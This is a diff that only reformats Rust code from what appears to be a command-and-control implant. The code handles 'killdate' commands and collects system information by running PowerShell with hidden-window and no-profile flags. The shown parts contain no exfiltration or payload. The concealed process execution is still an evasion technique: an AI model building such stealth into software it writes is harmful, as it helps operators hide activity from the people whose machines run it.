@@ -59,7 +59,11 @@ static KILL_DATE: AtomicI64 = AtomicI64::new(i64::MIN);
 
 fn get_kill_date() -> Option<i64> {
     let v = KILL_DATE.load(Ordering::Relaxed);
-    if v == i64::MIN { None } else { Some(v) }
+    if v == i64::MIN {
+        None
+    } else {
+        Some(v)
+    }
 }
 
 fn set_kill_date(timestamp: Option<i64>) {
@@ -470,13 +474,19 @@ fn collect_system_info() -> String {
 
     // Uptime via PowerShell (fiable sur toutes versions Windows)
     let mut uptime_cmd = Command::new("powershell.exe");
-    uptime_cmd.args(["-noP", "-sta", "-w", "1", "-c",
-               "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime \
-                | Select-Object -ExpandProperty TotalSeconds"]);
+    uptime_cmd.args([
+        "-noP",
+        "-sta",
+        "-w",
+        "1",
+        "-c",
+        "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime \
+                | Select-Object -ExpandProperty TotalSeconds",
+    ]);
     #[cfg(target_os = "windows")]
     {
         use std::os::windows::process::CommandExt;
-        uptime_cmd.creation_flags(0x0800_0000);   // CREATE_NO_WINDOW
+        uptime_cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
     }
     let uptime_out = uptime_cmd.output();
     if let Ok(out) = uptime_out {
@@ -627,7 +637,9 @@ fn handle_killdate_command(args: &str) -> String {
         match get_kill_date() {
             Some(timestamp) => {
                 // Convert timestamp to readable date
-                if let Some(date_time) = chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp) {
+                if let Some(date_time) =
+                    chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp)
+                {
                     format!(
                         "Current kill date: {}",
                         date_time.format("%Y-%m-%d %H:%M:%S")
@@ -645,7 +657,8 @@ fn handle_killdate_command(args: &str) -> String {
         // Parse date in format YYYY-MM-DD or timestamp
         if let Ok(timestamp) = args.parse::<i64>() {
             set_kill_date(Some(timestamp));
-            if let Some(date_time) = chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp) {
+            if let Some(date_time) = chrono::DateTime::<chrono::Utc>::from_timestamp_secs(timestamp)
+            {
                 format!(
                     "[+] Kill date set to: {}",
                     date_time.format("%Y-%m-%d %H:%M:%S")
